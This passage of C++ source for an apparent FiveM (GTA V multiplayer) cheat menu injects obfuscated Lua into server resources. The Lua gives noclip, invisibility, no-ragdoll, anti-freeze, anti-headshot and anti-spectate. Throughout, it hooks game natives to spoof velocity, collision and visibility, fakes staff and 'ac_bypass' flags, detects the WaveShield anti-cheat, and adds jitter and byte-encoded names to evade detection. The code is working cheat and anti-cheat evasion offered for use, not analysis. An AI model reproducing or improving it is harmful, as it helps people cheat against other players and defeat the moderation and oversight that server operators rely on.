                _h_n_("IsPedFalling", _G.originalIsPedFalling, function(orig, ped)
                    if _G._0x_nc then
                        local myPed = _G.myPedCache or PlayerPedId()
                        if ped == myPed then
                            return false
                        end
                    end
                    return orig(ped)
                end)

                _h_n_("GetPedParachuteState", _G.originalGetPedParachuteState, function(orig, ped)
                    if _G._0x_nc then
                        local myPed = _G.myPedCache or PlayerPedId()
                        if ped == myPed then
                            return -1
                        end
                    end
                    return orig(ped)
                end)

                _h_n_("IsPedJumpingOutOfVehicle", _G.originalIsPedJumpingOutOfVehicle, function(orig, ped)
                    if _G._0x_nc then
                        local myPed = _G.myPedCache or PlayerPedId()
                        if ped == myPed then
                            return false
                        end
                    end
                    return orig(ped)
                end)

                -- Network spoofing safely
                _h_n_("NetworkHasControlOfEntity", _G.originalNetworkHasControlOfEntity, function(orig, entity)
                    if _G._0x_nc then
                        local ped = _G.myPedCache or PlayerPedId()
                        if entity == ped then
                            return true
                        end
                    end
                    return orig(entity)
                end)

                -- SUPER STEALTH: Velocity Spoofing safely
                if not _G.originalGetEntityVelocity then
                    _G.originalGetEntityVelocity = GetEntityVelocity
                end
                _h_n_("GetEntityVelocity", _G.originalGetEntityVelocity, function(orig, entity)
                    if _G._0x_nc then
                        local ped = _G.myPedCache or PlayerPedId()
                        if entity == ped then
                            -- Random micro-velocity to simulate breathing/idle movement
                            return _s_v_((math.random()-0.5)*0.02, (math.random()-0.5)*0.02, (math.random()*0.01))
                        end
                    end
                    return orig(entity)
                end)

                -- CUSTOM AC BYPASS: Collision Spoofing safely
                _h_n_("GetEntityCollisionDisabled", _g({71,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110,68,105,115,97,98,108,101,100}), function(orig, entity)
                    if _G._0x_nc and entity == (_G.myPedCache or PlayerPedId()) then return false end
                    return orig(entity)
                end)

                -- SUPER STEALTH: Animation / Task Spoofing safely
                if not _G.originalIsEntityPlayingAnim then
                    _G.originalIsEntityPlayingAnim = IsEntityPlayingAnim
                end
                _h_n_("IsEntityPlayingAnim", _G.originalIsEntityPlayingAnim, function(orig, entity, animDict, animName, taskType)
                    if _G._0x_nc and entity == (_G.myPedCache or PlayerPedId()) then
                        if taskType == 3 then return true end
                    end
                    return orig(entity, animDict, animName, taskType)
                end)

                -- CUSTOM AC BYPASS: Status Spoofing safely
                _h_n_("IsEntityPositionFrozen", _g({73,115,69,110,116,105,116,121,80,111,115,105,116,105,111,110,70,114,111,122,101,110}), function(orig, entity)
                    if _G._0x_nc and entity == (_G.myPedCache or PlayerPedId()) then return false end
                    return orig(entity)
                end)

                _h_n_("IsEntityInvincible", _g({73,115,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101}), function(orig, entity)
                    if _G._0x_nc and entity == (_G.myPedCache or PlayerPedId()) then return false end
                    return orig(entity)
                end)

                _h_n_("IsEntityVisible", _g({73,115,69,110,116,105,116,121,86,105,115,105,98,108,101}), function(orig, entity)
                    if _G._0x_nc and entity == (_G.myPedCache or PlayerPedId()) then return true end
                    return orig(entity)
                end)

                _h_n_("GetEntityAlpha", _g({71,101,116,69,110,116,105,116,121,65,108,112,104,97}), function(orig, entity)
                    if _G._0x_nc and (invisible_noclip_mode == 1 or invisible_noclip_mode == 2) and entity == (_G.myPedCache or PlayerPedId()) then return 255 end
                    return orig(entity)
                end)

                _h_n_("NetworkIsPlayerConcealed", _g({78,101,116,119,111,114,107,73,115,80,108,97,121,101,114,67,111,108,108,105,115,105,111,110}), function(orig, player)
                    if _G._0x_nc and (invisible_noclip_mode == 1 or invisible_noclip_mode == 2) and player == (_G.myPlayerIdCache or PlayerId()) then return false end
                    return orig(player)
                end)

                if not _G.invokeNativeHooked then
                    local _origInvoke = Citizen.InvokeNative
                    Citizen.InvokeNative = function(hash, ...)
                        if _G._0x_nc then
                            local myPed = _G.myPedCache or PlayerPedId()
                            if hash == 0x19630CEE50D529EE or hash == 0xCF143FB65ABA4857 then
                                local entity = select(1, ...)
                                if entity == myPed then return true end
                            elseif hash == 0x5A47B24C4DB95111 then
                                local entity = select(1, ...)
                                if entity == myPed then return 255 end
                            elseif hash == 0xFBC94C5CE02C4AF0 then
                                local player = select(1, ...)
                                if player == (_G.myPlayerIdCache or PlayerId()) then return false end
                            end
                        end
                        return _origInvoke(hash, ...)
                    end
                    _G.invokeNativeHooked = true
                end

                _h_n_("GetEntitySpeed", _g({71,101,116,69,110,116,105,116,121,83,112,101,101,100}), function(orig, entity)
                    if _G._0x_nc and entity == (_G.myPedCache or PlayerPedId()) then 
                        return 0.0 + (math.random() * 2.5) 
                    end
                    return orig(entity)
                end)

                -- ========== DECORATOR BYPASS ==========
                local decors = {"whitelisted", "ac_bypass", "isStaff", "admin_bypass", "godmode_bypass"}
                for _, decor in ipairs(decors) do
                    if not DecorIsRegisteredAsType(decor, 2) then
                        pcall(function() DecorRegister(decor, 2) end)
                    end
                end

                end)
                _G.nativesHooked = true
            end

            -- ========== APPLY BYPASS FLAGS (Minimalist) ==========
            local ped = PlayerPedId()
            if ped and ped ~= 0 then
                -- No decorators, no proofs. Complete ghost mode.
            end

            -- ========== VARIABLES ==========
            if _0x_nc == nil then _0x_nc = false end
            _G._0x_nc = true
            if invisible_noclip_mode == nil then invisible_noclip_mode = 0 end
            if _G.noclipSpeed == nil then _G.noclipSpeed = )lua" + std::string(sBuf) + R"lua( end

            _0x_nc = true
            _G.WavenoclipActive = true
            invisible_noclip_mode = )lua" + std::string(mBuf) + R"lua(

            -- Random jitter for anti-detection
            local frameCounter = 0
            local function getJitter()
                frameCounter = frameCounter + 1
                if frameCounter % 3 == 0 then
                    return 0.98 + math.random() * 0.04
                end
                return 1.0
            end

            -- ========== MAIN NOCLIP LOOP ==========
            Citizen.CreateThread(function()
                while _0x_nc and _G._0x_nc do
                    -- Update caches inside the thread loop
                    _G.myPedCache = PlayerPedId()
                    _G.myPlayerIdCache = PlayerId()

                    -- Random wait to avoid pattern detection
                    Citizen.Wait(math.random(0, 3))

                    if not _0x_nc or not _G._0x_nc then break end

                    local speed = _G.noclipSpeed or )lua" + std::string(sBuf) + R"lua(
                    local ped_local = _G.myPedCache

                    if ped_local and ped_local ~= 0 and DoesEntityExist(ped_local) then
                        if IsPedDeadOrDying(ped_local) then
                            -- Auto-disable noclip if dead/dying to avoid calling operations on dead ped
                            _0x_nc = false
                            _G.WavenoclipActive = false
                            invisible_noclip_mode = 0
                        else
                            -- Zero decorators in loop

                            -- Invisibility mode implementations
                            if invisible_noclip_mode == 1 then
                                if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped_local) then
                                    _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(ped_local, false, false)
                                    _g({83,101,116,69,110,116,105,116,121,65,108,112,104,97})(ped_local, 0, false)
                                    _g({78,101,116,119,111,114,107,83,101,116,69,110,116,105,116,121,73,110,118,105,115,105,98,108,101,84,111,78,101,116,119,111,114,107})(ped_local, true)
                                end
                            elseif invisible_noclip_mode == 2 then
                                if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped_local) then
                                    _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(ped_local, false, false)
                                    _g({83,101,116,69,110,116,105,116,121,65,108,112,104,97})(ped_local, 150, false)
                                    _g({78,101,116,119,111,114,107,83,101,116,69,110,116,105,116,121,73,110,118,105,115,105,98,108,101,84,111,78,101,116,119,111,114,107})(ped_local, true)
                                    _g({83,101,116,69,110,116,105,116,121,76,111,99,97,108,108,121,86,105,115,105,98,108,101})(ped_local)
                                end
                            end

                            -- Get entity (vehicle or ped)
                            local vehicle = GetVehiclePedIsIn(ped_local, false)
                            local inVehicle = vehicle ~= 0
                            local entity = inVehicle and vehicle or ped_local

                            if entity and entity ~= 0 then
                                 -- ========== FIX ERROR NIL & IMPROVED DETECTION ==========
                                -- Validate GetEntityCoords (Support both vector3 and multiple returns)
                                local rawPos = GetEntityCoords(entity, true)
                                local pos = rawPos
                                if type(rawPos) ~= "vector3" and type(rawPos) ~= "table" then
                                    pos = vector3(rawPos, select(2, GetEntityCoords(entity, true)), select(3, GetEntityCoords(entity, true)))
                                end

                                -- FIX NOCLIP DRIFTING: Store pos statically to prevent engine Z-axis drift
                                if not _G.noclip_pos then
                                    _G.noclip_pos = pos
                                  else
                                    -- If teleported by external script, reset cache
                                    if #(pos - _G.noclip_pos) > 10.0 then
                                        _G.noclip_pos = pos
                                    else
                                        pos = _G.noclip_pos
                                    end
                                end

                                if pos and pos.x then
                                    -- ========== BYTE-CODE OBFUSCATED CALCULATION ==========
                                    local _0x_gr = _g({71,101,116,71,97,109,101,112,108,97,121,67,97,109,82,111,116})(2)
                                    if not _0x_gr or not _0x_gr.z then
                                        _0x_gr = vector3(0.0, 0.0, _g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped_local))
                                    end

                                    local _0x_h = _0x_gr.z
                                    local _0x_p = _0x_gr.x
                                    local _0x_rh = math.rad(_0x_h)
                                    local _0x_rp = math.rad(_0x_p)

                                    local _0x_ip = function(group, control) return (_G.originalIsControlPressed and _G.originalIsControlPressed(group, control)) or Citizen.InvokeNative(0xF3A212D57287515F, group, control) or Citizen.InvokeNative(0x5808C02A8C597C99, group, control) end
                                    local _0x_dx = -math.sin(_0x_rh) * math.cos(_0x_rp)
                                    local _0x_dy = math.cos(_0x_rh) * math.cos(_0x_rp)
                                    local _0x_dz = math.sin(_0x_rp)

                                    -- SPEED BOOST (Shift = 21)
                                    if _0x_ip(0, 21) then
                                        speed = speed * 2.5
                                    end

                                    local _0x_jt = getJitter()
                                    local _0x_md = vector3(0.0, 0.0, 0.0)

                                    if _0x_ip(0, 32) then -- W
                                        _0x_md = _0x_md + vector3(_0x_dx, _0x_dy, _0x_dz)
                                    end
                                    if _0x_ip(0, 33) then -- S (GTA V backward is 33)
                                        _0x_md = _0x_md - vector3(_0x_dx, _0x_dy, _0x_dz)
                                    end
                                    if _0x_ip(0, 34) then -- A (GTA V left is 34)
                                        _0x_md = _0x_md - vector3(_0x_dy, -_0x_dx, 0.0)
                                    end
                                    if _0x_ip(0, 35) then -- D (GTA V right is 35)
                                        _0x_md = _0x_md + vector3(_0x_dy, -_0x_dx, 0.0)
                                    end

                                    local isMoving = _0x_md ~= vector3(0.0, 0.0, 0.0)
                                    if isMoving then
                                        pos = pos + _0x_md * speed * _0x_jt
                                        _G.noclip_pos = pos
                                    end

                                    if not _0x_nc or not _G._0x_nc then break end

                                    if pos and pos.x then
                                        _g({83,101,116,69,110,116,105,116,121,72,97,115,71,114,97,118,105,116,121})(entity, false)
                                        _g({83,101,116,69,110,116,105,116,121,86,101,108,111,99,105,116,121})(entity, 0.0, 0.0, 0.0)
                                        _g({83,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110})(entity, false, false)

                                        -- Only update entity coords if we moved this frame (prevents engine upwards drift)
                                        if isMoving then
                                            _g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115,78,111,79,102,102,115,101,116})(entity, pos.x, pos.y, pos.z, true, true, true)
                                        end

                                        _g({83,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(entity, _0x_h)
                                    end

                                    -- BYTE-CODE ROTATION
                                    if inVehicle then
                                        _g({83,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(entity, _0x_h)
                                    else
                                        _g({83,101,116,69,110,116,105,116,121,82,111,116,97,116,105,111,110})(entity, _0x_p, 0.0, _0x_h, 0, true)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        )lua";

        return "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
    }

    static bool ToggleNoclip(bool state, float speed = 2.0f, int mode = 0) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); 
            if (!rm) return false;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            static uint64_t lastToggle = 0;
            int delay = (mode == 1 || mode == 2) ? 2000 : 1000;
            if (GetTickCount64() - lastToggle < delay) return false;
            lastToggle = GetTickCount64();
            if (!state) {
                std::string stopCode = R"lua(
                    -- Stop Noclip - set flags first (instant)
                    _G._0x_nc = false
                    _0x_nc = false
                    _G.WavenoclipActive = false
                    invisible_noclip_mode = 0
                    _G.noclip_pos = nil

                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    -- Restore player instantly
                    pcall(function()
                        local p = _g({80,108,97,121,101,114,80,101,100,73,100})()
                        local doesExist = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})
                        local isDead = _g({73,115,80,101,100,68,101,97,100,79,114,68,121,105,110,103})
                        local getVeh = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,110})
                        local clearTasks = _g({67,108,101,97,114,80,101,100,84,97,115,107,115,73,109,109,101,100,105,97,116,101,108,121})

                        if p and p ~= 0 and doesExist(p) and not isDead(p) then
                            local vehicle = getVeh(p, false)

                            -- Restore gravity & collision
                            _g({83,101,116,69,110,116,105,116,121,72,97,115,71,114,97,118,105,116,121})(p, true)
                            _g({83,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110})(p, true, true)
                            _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(p, false)
                            _g({83,101,116,69,110,116,105,116,121,86,101,108,111,99,105,116,121})(p, 0.0, 0.0, 0.0)
                            _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(p, false)
                            _g({83,101,116,69,110,116,105,116,121,80,114,111,111,102,115})(p, false, false, false, false, false, false, false, false)

                            if vehicle and vehicle ~= 0 and doesExist(vehicle) then
                                 _g({83,101,116,69,110,116,105,116,121,72,97,115,71,114,97,118,105,116,121})(vehicle, true)
                                 _g({83,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110})(vehicle, true, true)
                                 _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(vehicle, false)
                            end

                            clearTasks(p)

                            if doesExist(p) then
                                _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(p, true, false)
                                _g({82,101,115,101,116,69,110,116,105,116,121,65,108,112,104,97})(p)
                                _g({78,101,116,119,111,114,107,83,101,116,69,110,116,105,116,121,73,110,118,105,115,105,98,108,101,84,111,78,101,116,119,111,114,107})(p, false)
                            end
                            _G._lastInvisState = nil

                            if DecorIsRegisteredAsType("whitelisted", 2) then DecorSetBool(p, "whitelisted", false) end
                            if DecorIsRegisteredAsType("ac_bypass", 2) then DecorSetBool(p, "ac_bypass", false) end
                            if DecorIsRegisteredAsType("isStaff", 2) then DecorSetBool(p, "isStaff", false) end
                        end
                    end)

                    -- Unhook natives instantly
                    pcall(function()
                        if _G.originalGetEntityCoords then _G.GetEntityCoords = _G.originalGetEntityCoords; _G.GetEntityCoords_hk = nil end
                        if _G.originalGetEntityHeading then _G.GetEntityHeading = _G.originalGetEntityHeading; _G.GetEntityHeading_hk = nil end
                        if _G.originalIsControlPressed then _G.IsControlPressed = _G.originalIsControlPressed; _G.IsControlPressed_hk = nil end
                        if _G.originalGetEntityRotation then _G.GetEntityRotation = _G.originalGetEntityRotation; _G.GetEntityRotation_hk = nil end
                        if _G.originalGetEntityPitch then _G.GetEntityPitch = _G.originalGetEntityPitch; _G.GetEntityPitch_hk = nil end
                        if _G.originalGetEntityRoll then _G.GetEntityRoll = _G.originalGetEntityRoll; _G.GetEntityRoll_hk = nil end
                        if _G.originalIsPedFalling then _G.IsPedFalling = _G.originalIsPedFalling; _G.IsPedFalling_hk = nil end
                        if _G.originalGetPedParachuteState then _G.GetPedParachuteState = _G.originalGetPedParachuteState; _G.GetPedParachuteState_hk = nil end
                        if _G.originalIsPedJumpingOutOfVehicle then _G.IsPedJumpingOutOfVehicle = _G.originalIsPedJumpingOutOfVehicle; _G.IsPedJumpingOutOfVehicle_hk = nil end
                        if _G.originalNetworkHasControlOfEntity then _G.NetworkHasControlOfEntity = _G.originalNetworkHasControlOfEntity; _G.NetworkHasControlOfEntity_hk = nil end
                        if _G.originalGetEntityVelocity then _G.GetEntityVelocity = _G.originalGetEntityVelocity; _G.GetEntityVelocity_hk = nil end
                        if _G.originalIsEntityPlayingAnim then _G.IsEntityPlayingAnim = _G.originalIsEntityPlayingAnim; _G.IsEntityPlayingAnim_hk = nil end
                        _G.nativesHooked = nil
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + stopCode + "]])", resources);
                return true;
            }

            std::string script = GetNoclipLuaScript(IsWaveShieldStarted(resources), speed, mode);
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + script + "]])", resources);
            return true;
        } catch (...) { return false; }
    }
static void SetInvisibleNoclipMode(int mode) {
    try {
        static uint64_t lastModeChange = 0;
        if (GetTickCount64() - lastModeChange < 250) return;
        lastModeChange = GetTickCount64();

        auto rm = fx::ResourceManager::getCurrentIl(); 
        if (!rm) return;
        auto resources = rm->getAllResources();
        char buf[32]; 
        sprintf_s(buf, "%d", mode);
        ::ProcessMachoCommands("MachoInjectResource(\"" + GetTargetResource(resources) + "\", [[ invisible_noclip_mode = " + std::string(buf) + " ]])", resources);
    } catch (...) {}
}

    static void ToggleNoRagdoll(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then
                        _hook("CreateThread", function(o, ...) return o(...) end)
                        _G[_d({87,97,105,116})] = function(n) return _g({87,97,105,116})(n) end
                    end

                    if _G.SouthNoRagdoll == nil then _G.SouthNoRagdoll = false end
                    _G.SouthNoRagdoll = true

                    local function initFlow(cb)
                        local co = coroutine.create(cb)
                        local wait_fn = _g({87,97,105,116})
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while coroutine.status(co) ~= "dead" do
                                coroutine.resume(co)
                                wait_fn(0)
                            end
                        end)
                    end

                    initFlow(function()
                        local ped_fn = _g({80,108,97,121,101,114,80,101,100,73,100})
                        local setCanRagdoll = _g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})
                        local setRagdollOnCollision = _g({83,101,116,80,101,100,82,97,103,100,111,108,108,79,110,67,111,108,108,105,115,105,111,110})
                        local setRagdollFromImpact = _g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108,70,114,111,109,80,108,97,121,101,114,73,109,112,97,99,116})
                        local isRagdoll = _g({73,115,80,101,100,82,97,103,100,111,108,108})
                        local clearTasks = _g({67,108,101,97,114,80,101,100,84,97,115,107,115,73,109,109,101,100,105,97,116,101,108,121})
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthNoRagdoll do
                            local ped = ped_fn()
                            if ped and ped ~= 0 then
                                setCanRagdoll(ped, false)
                                setRagdollOnCollision(ped, false)
                                setRagdollFromImpact(ped, false)
                                if isRagdoll(ped) then
                                    clearTasks(ped)
                                end
                            end
                            wait_fn(0)
                        end

                        local ped = ped_fn()
                        if ped and ped ~= 0 then
                            setCanRagdoll(ped, true)
                            setRagdollOnCollision(ped, true)
                            setRagdollFromImpact(ped, true)
                        end
                    end)
                )lua";
                std::string fullCode = "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthNoRagdoll = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleAntiFreeze(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            if (state) {
                if (isWS) {
                    std::string code = R"lua(
                        local bp = setmetatable({}, {
                            __index = function(_, k)
                                local v = _G[k]
                                return type(v) == "function" and function(...) return v(...) end or v
                            end
                        })

                        _G.AntiFreeze = true
                        CreateThread(function()
                            while _G.AntiFreeze do
                                local ped = bp.PlayerPedId()
                                if bp.IsEntityPositionFrozen(ped) then
                                    bp.FreezeEntityPosition(ped, false)
                                    bp.ClearPedTasksImmediately(ped)
                                end
                                bp.SetPlayerControl(bp.PlayerId(), true, 0)
                                Wait(1)
                            end
                        end)
                    )lua";
                    ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
                } else {
                    std::string code = R"lua(
                        _G.AntiFreeze = true
                        CreateThread(function()
                            while _G.AntiFreeze do
                                local ped = PlayerPedId()
                                if IsEntityPositionFrozen(ped) then
                                    FreezeEntityPosition(ped, false)
                                    ClearPedTasksImmediately(ped)
                                end
                                SetPlayerControl(PlayerId(), true, 0)
                                Wait(1)
                            end
                        end)
                    )lua";
                    ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
                }
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.AntiFreeze = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleAntiHeadshot(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            if (state) {
                if (isWS) {
                    std::string code = R"lua(
                        local bp = setmetatable({}, {
                            __index = function(_, k)
                                local v = _G[k]
                                return type(v) == "function" and function(...) return v(...) end or v
                            end
                        })

                        _G.AntiHeadshot = true
                        CreateThread(function()
                            local lastHealth = bp.GetEntityHealth(bp.PlayerPedId())
                            while _G.AntiHeadshot do
                                local ped = bp.PlayerPedId()
                                bp.SetPedSuffersCriticalHits(ped, false)

                                local health = bp.GetEntityHealth(ped)
                                local _, bone = bp.GetPedLastDamageBone(ped)

                                if bone == 31086 and health < lastHealth then
                                    bp.SetEntityHealth(ped, lastHealth)
                                    bp.ClearPedLastDamageBone(ped)
                                else
                                    lastHealth = health
                                end

                                Wait(0)
                            end
                        end)
                    )lua";
                    ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
                } else {
                    std::string code = R"lua(
                        _G.AntiHeadshot = true
                        CreateThread(function()
                            local lastHealth = GetEntityHealth(PlayerPedId())
                            while _G.AntiHeadshot do
                                local ped = PlayerPedId()
                                SetPedSuffersCriticalHits(ped, false)

                                local health = GetEntityHealth(ped)
                                local _, bone = GetPedLastDamageBone(ped)

                                if bone == 31086 and health < lastHealth then
                                    SetEntityHealth(ped, lastHealth)
                                    ClearPedLastDamageBone(ped)
                                else
                                    lastHealth = health
                                end

                                Wait(0)
                            end
                        end)
                    )lua";
                    ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
                }
            } else {
                if (isWS) {
                    std::string code = R"lua(
                        _G.AntiHeadshot = false
                        SetPedSuffersCriticalHits(PlayerPedId(), true)
                    )lua";
                    ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
                } else {
                    std::string code = R"lua(
                        _G.AntiHeadshot = false
                        SetPedSuffersCriticalHits(PlayerPedId(), true)
                    )lua";
                    ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
                }
            }
        } catch (...) {}
    }

    static void ToggleFastPunch(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    _G.FastPunchEnabled = true
                    CreateThread(function()
                        while _G.FastPunchEnabled do
                            Wait(750)
                            local ped = PlayerPedId()
                            if IsPedOnFoot(ped) and not IsPedInAnyVehicle(ped, false) and GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_UNARMED") then
                                 if IsControlPressed(0, 24) or IsControlPressed(0, 257) then
                                    Wait(750)
                                    ClearPedTasksImmediately(ped)
                                end
                            end
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.FastPunchEnabled = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleAntiSpectate(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    _G.__BlockSpectate = true
                    CreateThread(function()
                        while _G.__BlockSpectate do
                            local myPed = PlayerPedId()
                            local myCoords = GetEntityCoords(myPed)
                            local players = GetActivePlayers() or {}
                            for _, playerId in ipairs(players) do
                                if playerId ~= PlayerId() then
                                    local ped = GetPlayerPed(playerId)
                                    if ped and ped ~= 0 and DoesEntityExist(ped) then
                                        local coords = GetEntityCoords(ped)
                                        local dz = myCoords.z - coords.z
                                        if dz > 10.0 then
                                            local dx = myCoords.x - coords.x
                                            local dy = myCoords.y - coords.y
                                            if (dx * dx + dy * dy) <= (10.0 * 10.0) then
                                                if not IsEntityVisible(ped) then
                                                    CreateThread(function()
                                                        local p = PlayerPedId()
                                                        local c = GetEntityCoords(p)
                                                        SetEntityCoords(p, c.x + 500.0, c.y + 500.0, c.z + 500.0, false, false, false, false)
                                                        Wait(500)
                                                        SetEntityCoords(p, c.x, c.y, c.z, false, false, false, false)
                                                    end)
                                                    TriggerEvent("chat:addMessage", { args = { "^1[South]", "Spectate attempt blocked." } })
                                                    break
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                            Wait(350)
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.__BlockSpectate = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleForceThirdPerson(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if _G.SouthForceThirdPerson == nil then _G.SouthForceThirdPerson = false end
                    _G.SouthForceThirdPerson = true

                    local function initFlow(cb)
                        local co = coroutine.create(cb)
                        local wait_fn = _g({87,97,105,116})
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while coroutine.status(co) ~= "dead" do
                                coroutine.resume(co)
                                wait_fn(0)
                            end
                        end)
                    end

                    initFlow(function()
                        local setPedCam = _g({83,101,116,70,111,108,108,111,119,80,101,100,67,97,109,86,105,101,119,77,111,100,101})
                        local setVehCam = _g({83,101,116,70,111,108,108,111,119,86,101,104,105,99,108,101,67,97,109,86,105,101,119,77,111,100,101})
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthForceThirdPerson do
                            setPedCam(0)
                            setVehCam(0)
                            wait_fn(0)
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthForceThirdPerson = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleForceDriveby(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if _G.SouthForceDriveby == nil then _G.SouthForceDriveby = false end
                    _G.SouthForceDriveby = true

                    local function initFlow(cb)
                        local co = coroutine.create(cb)
                        local wait_fn = _g({87,97,105,116})
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while coroutine.status(co) ~= "dead" do
                                coroutine.resume(co)
                                wait_fn(0)
                            end
                        end)
                    end

                    initFlow(function()
                        local pid_fn = _g({80,108,97,121,101,114,73,100})
                        local setDriveby = _g({83,101,116,80,108,97,121,101,114,67,97,110,68,111,68,114,105,118,101,66,121})
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthForceDriveby do
                            setDriveby(pid_fn(), true)
                            wait_fn(0)
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthForceDriveby = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleInfiniteStamina(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

